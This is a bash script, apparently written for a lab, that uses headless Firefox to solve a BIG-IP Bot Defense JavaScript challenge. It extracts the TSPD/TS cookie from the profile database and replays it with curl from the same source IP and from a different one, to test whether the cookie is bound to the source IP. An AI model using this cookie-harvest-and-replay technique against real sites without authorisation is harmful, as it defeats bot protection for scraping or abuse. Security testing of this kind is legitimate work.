#!/usr/bin/env bash
# bot-cookie-replay.sh
#
# Demonstrate the binding boundary of the BIG-IP Bot Defense TSPD_101 cookie:
# solve the JS challenge once with headless Firefox, then replay the earned
# cookie with curl from (a) the same source and (b) a DIFFERENT source IP.
# Base-distro only: firefox-esr + python3 (stdlib) + curl. No Selenium/pip.
#
# Usage:  ./bot-cookie-replay.sh <url> [wait_secs] [alt_source_ip]
#   e.g.  ./bot-cookie-replay.sh http://10.1.10.74/ 8 10.1.10.200
#
set -uo pipefail

URL="${1:-http://10.1.10.74/}"
WAIT="${2:-8}"
ALT_IF="${3:-10.1.10.200}"
OUT="$(mktemp -d)"; PROF="$OUT/prof"; mkdir -p "$PROF"
FF="$(command -v firefox-esr || command -v firefox || true)"
[ -z "$FF" ] && { echo "firefox-esr not found (base Kali ships it)."; exit 1; }

# Did a saved response get the app, or the challenge?
verdict() {
    if grep -qiE "challenge|please wait|javascript|window\.location|eval\(" "$1"; then
        echo "CHALLENGED (bot defense served the JS challenge)"
    else
        echo "PASSED (reached the app)"
    fi
}

echo "== 1) Solve the challenge with headless Firefox =="
"$FF" --headless --new-instance --profile "$PROF" "$URL" >/dev/null 2>&1 &
FFPID=$!; sleep "$WAIT"; kill -TERM "$FFPID" 2>/dev/null; sleep 2

# Pull the bot-defense cookie (TSPD* preferred, else first TS*) via stdlib sqlite3
TS="$(python3 - "$PROF/cookies.sqlite" <<'PY'
import sqlite3, sys, os, shutil, tempfile
db = sys.argv[1]
if not os.path.exists(db): sys.exit()
t = tempfile.mktemp(); shutil.copy(db, t)
rows = list(sqlite3.connect(t).execute("select name,value from moz_cookies"))
os.remove(t)
pick = next((f"{n}={v}" for n,v in rows if n.upper().startswith("TSPD")), None) \
     or next((f"{n}={v}" for n,v in rows if n.upper().startswith("TS")), "")
print(pick)
PY
)"
if [ -z "$TS" ]; then
    echo "No TSPD/TS cookie earned — raise wait_secs and retry."; exit 1
fi
echo "Earned cookie: ${TS%%=*}=<redacted>"

echo; echo "== 2) Replay from the SAME source (kali primary) =="
curl -s -o "$OUT/same.html" -A "Mozilla/5.0" -b "$TS" "$URL"
echo "   -> $(verdict "$OUT/same.html")"

echo; echo "== 3) Replay the SAME cookie bound to a DIFFERENT source ($ALT_IF) =="
curl -s -o "$OUT/alt.html" --interface "$ALT_IF" -A "Mozilla/5.0" -b "$TS" "$URL"
echo "   -> $(verdict "$OUT/alt.html")"

echo
echo "Interpretation:"
echo "  same PASSED, alt CHALLENGED  -> cookie is source-IP bound (cross-host replay blocked)"
echo "  both PASSED                  -> not strictly IP-bound (replayable to other hosts within TTL)"
echo "  both CHALLENGED              -> also bound to something curl lacks (User-Agent / TLS fingerprint)"
echo
echo "Saved responses: $OUT/same.html  $OUT/alt.html"
